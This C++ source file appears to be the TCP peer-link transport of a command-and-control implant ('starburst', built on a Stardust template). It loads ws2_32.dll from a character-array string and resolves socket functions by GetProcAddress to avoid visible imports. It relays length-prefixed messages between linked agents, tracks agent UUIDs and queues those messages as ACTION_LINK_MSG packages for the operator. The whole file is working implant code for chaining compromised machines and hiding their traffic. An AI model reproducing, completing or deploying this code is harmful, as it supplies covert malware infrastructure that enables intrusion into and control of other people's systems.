#include <common.h>
#include <transport_tcp.h>
#include <config.h>
#include <package.h>
#include <parser.h>
#include <strings.h>
#include <base64.h>

#if defined( INCLUDE_CMD_CONNECT ) || defined( INCLUDE_CMD_DISCONNECT ) || defined( TCP_TRANSPORT )

using namespace stardust;
using namespace starburst;

auto declfn starburst::tcp_resolve_ws2(
    _Inout_ instance&     inst,
    _Out_   TcpLinkState* state
) -> bool {
    if ( state->initialized ) return true;

    memory::zero( &state->ws, sizeof( TcpWsApis ) );

    char ws2_name[] = { 'w','s','2','_','3','2','.','d','l','l', 0 };
    state->h_ws2 = inst.kernel32.LoadLibraryA( ws2_name );
    if ( !state->h_ws2 ) return false;

    state->ws.pWSAStartup = reinterpret_cast<tcp_fn_WSAStartup>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "WSAStartup" ) ) ) );
    state->ws.psocket = reinterpret_cast<tcp_fn_socket>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "socket" ) ) ) );
    state->ws.pconnect = reinterpret_cast<tcp_fn_connect>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "connect" ) ) ) );
    state->ws.psend = reinterpret_cast<tcp_fn_send>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "send" ) ) ) );
    state->ws.precv = reinterpret_cast<tcp_fn_recv>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "recv" ) ) ) );
    state->ws.pclosesocket = reinterpret_cast<tcp_fn_closesocket>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "closesocket" ) ) ) );
    state->ws.pselect = reinterpret_cast<tcp_fn_select>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "select" ) ) ) );
    state->ws.pioctlsocket = reinterpret_cast<tcp_fn_ioctlsocket>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "ioctlsocket" ) ) ) );
    state->ws.pWSAGetLastError = reinterpret_cast<tcp_fn_WSAGetLastError>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "WSAGetLastError" ) ) ) );
    state->ws.pWSACleanup = reinterpret_cast<tcp_fn_WSACleanup>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "WSACleanup" ) ) ) );
    state->ws.phtons = reinterpret_cast<tcp_fn_htons>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "htons" ) ) ) );
    state->ws.pntohs = reinterpret_cast<tcp_fn_ntohs>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "ntohs" ) ) ) );
    state->ws.pinet_addr = reinterpret_cast<tcp_fn_inet_addr>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "inet_addr" ) ) ) );
    state->ws.pbind = reinterpret_cast<tcp_fn_bind>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "bind" ) ) ) );
    state->ws.plisten = reinterpret_cast<tcp_fn_listen>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "listen" ) ) ) );
    state->ws.paccept = reinterpret_cast<tcp_fn_accept>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "accept" ) ) ) );
    state->ws.psetsockopt = reinterpret_cast<tcp_fn_setsockopt>(
        inst.kernel32.GetProcAddress( state->h_ws2, symbol<char*>( const_cast<char*>( "setsockopt" ) ) ) );

    if ( !state->ws.pWSAStartup || !state->ws.psocket || !state->ws.pconnect ||
         !state->ws.psend || !state->ws.precv || !state->ws.pclosesocket ||
         !state->ws.pselect || !state->ws.phtons || !state->ws.pinet_addr ) {
        return false;
    }

    uint8_t wsa_data[512] = {};
    if ( state->ws.pWSAStartup( 0x0202, wsa_data ) != 0 ) {
        return false;
    }

    state->initialized = true;
    return true;
}

auto declfn starburst::tcp_link_recv(
    _Inout_ instance&     inst,
    _In_    TcpLinkState* ts,
    _In_    uintptr_t     sock,
    _Out_   uint8_t**     data,
    _Out_   uint32_t*     len
) -> bool {
    *data = nullptr;
    *len  = 0;

    tcp_fd_set rset;
    rset.fd_count = 1;
    rset.fd_array[0] = sock;

    tcp_timeval tv = { 0, 0 };
    int ready = ts->ws.pselect( 0, &rset, nullptr, nullptr, &tv );
    if ( ready <= 0 ) return false;

    uint8_t header[4] = {};
    int total_hdr = 0;
    while ( total_hdr < 4 ) {
        int r = ts->ws.precv( sock, reinterpret_cast<char*>( header + total_hdr ),
                              4 - total_hdr, 0 );
        if ( r <= 0 ) return false;
        total_hdr += r;
    }

    uint32_t msg_size = ((uint32_t)header[0] << 24) |
                        ((uint32_t)header[1] << 16) |
                        ((uint32_t)header[2] << 8)  |
                        ((uint32_t)header[3]);

    if ( msg_size == 0 || msg_size > 0x3C00000 ) return false;

    auto buf = static_cast<uint8_t*>( inst.heap_alloc( msg_size ) );
    if ( !buf ) return false;

    uint32_t total_read = 0;
    while ( total_read < msg_size ) {
        uint32_t chunk = msg_size - total_read;
        if ( chunk > TCP_RECV_BUF_MAX ) chunk = TCP_RECV_BUF_MAX;

        int r = ts->ws.precv( sock, reinterpret_cast<char*>( buf + total_read ),
                              static_cast<int>( chunk ), 0 );
        if ( r <= 0 ) {
            inst.heap_free( buf );
            return false;
        }
        total_read += static_cast<uint32_t>( r );
    }

    *data = buf;
    *len  = msg_size;
    return true;
}

auto declfn starburst::tcp_link_send(
    _Inout_ instance&     inst,
    _In_    TcpLinkState* ts,
    _In_    uintptr_t     sock,
    _In_    uint8_t*      data,
    _In_    uint32_t      len
) -> bool {
    uint8_t header[4];
    header[0] = (len >> 24) & 0xFF;
    header[1] = (len >> 16) & 0xFF;
    header[2] = (len >> 8)  & 0xFF;
    header[3] = len & 0xFF;

    int sent = 0;
    while ( sent < 4 ) {
        int r = ts->ws.psend( sock, reinterpret_cast<const char*>( header + sent ),
                              4 - sent, 0 );
        if ( r <= 0 ) return false;
        sent += r;
    }

    uint32_t offset = 0;
    while ( offset < len ) {
        uint32_t chunk = len - offset;
        if ( chunk > TCP_RECV_BUF_MAX ) chunk = TCP_RECV_BUF_MAX;

        int r = ts->ws.psend( sock, reinterpret_cast<const char*>( data + offset ),
                              static_cast<int>( chunk ), 0 );
        if ( r <= 0 ) return false;
        offset += static_cast<uint32_t>( r );
    }

    return true;
}

auto declfn starburst::tcp_link_send_msg(
    _Inout_ instance&          inst,
    _In_    instance::TcpLink* link,
    _In_    uint8_t*           data,
    _In_    uint32_t           len
) -> bool {
    auto ts = static_cast<TcpLinkState*>( inst.tcp_link_state );
    if ( !ts || !ts->initialized ) return false;
    return tcp_link_send( inst, ts, link->socket, data, len );
}

auto declfn starburst::tcp_poll_links(
    _Inout_ instance& inst
) -> void {
    auto ts = static_cast<TcpLinkState*>( inst.tcp_link_state );
    if ( !ts || !ts->initialized ) return;

    auto cur = inst.tcp_links;
    while ( cur ) {
        auto next_link = cur->next;

        if ( cur->connected && cur->socket != TCP_INVALID_SOCKET ) {
            uint32_t pkts = 0;
            while ( pkts < MAX_TCP_PKTS_PER_LOOP ) {
                uint8_t* msg_buf = nullptr;
                uint32_t msg_size = 0;

                if ( !tcp_link_recv( inst, ts, cur->socket, &msg_buf, &msg_size ) )
                    break;

                if ( msg_size >= 48 && cur->agent_id ) {
                    uint32_t dec_len = 0;
                    auto dec = starburst::base64_decode( inst, msg_buf, 48, &dec_len );
                    if ( dec && dec_len >= 36 ) {
                        if ( starburst::str_ncmp( cur->agent_id,
                                reinterpret_cast<char*>( dec ), 36 ) != 0 ) {
                            auto nid = static_cast<char*>( inst.heap_alloc( 37 ) );
                            if ( nid ) {
                                memory::copy( nid, dec, 36 );
                                nid[36] = 0;
                                inst.heap_free( cur->agent_id );
                                cur->agent_id = nid;
                                DBG_PRINT( inst, "tcp_link: UUID updated to %s\n", nid );
                            }
                        }
                        inst.heap_free( dec );
                    } else if ( dec ) {
                        inst.heap_free( dec );
                    }
                }

                auto dpkg = starburst::package_create( inst );
                if ( dpkg ) {
                    starburst::package_add_byte( inst, dpkg, ACTION_LINK_MSG );
                    starburst::package_add_string( inst, dpkg, cur->agent_id ?
                        cur->agent_id : symbol<char*>( const_cast<char*>( "" ) ) );
                    starburst::package_add_bytes( inst, dpkg, msg_buf, msg_size );

                    uint32_t dlen = 0;
                    auto ddata = starburst::package_build( dpkg, &dlen );

                    uint32_t needed = inst.response_queue.length + 4 + dlen;
                    if ( needed > inst.response_queue.capacity ) {
                        uint32_t nc = inst.response_queue.capacity == 0 ? 1024 : inst.response_queue.capacity;
                        while ( nc < needed ) nc *= 2;
                        inst.response_queue.buffer = static_cast<uint8_t*>(
                            inst.heap_realloc( inst.response_queue.buffer, nc ) );
                        inst.response_queue.capacity = nc;
                    }
                    auto qb = inst.response_queue.buffer + inst.response_queue.length;
                    qb[0] = (dlen >> 24) & 0xFF;
                    qb[1] = (dlen >> 16) & 0xFF;
                    qb[2] = (dlen >> 8)  & 0xFF;
                    qb[3] = dlen & 0xFF;
                    memory::copy( qb + 4, ddata, dlen );
                    inst.response_queue.length += 4 + dlen;

                    starburst::package_destroy( inst, dpkg );
                }

                inst.heap_free( msg_buf );
                pkts++;
            }
        }
        cur = next_link;
    }
}

#endif
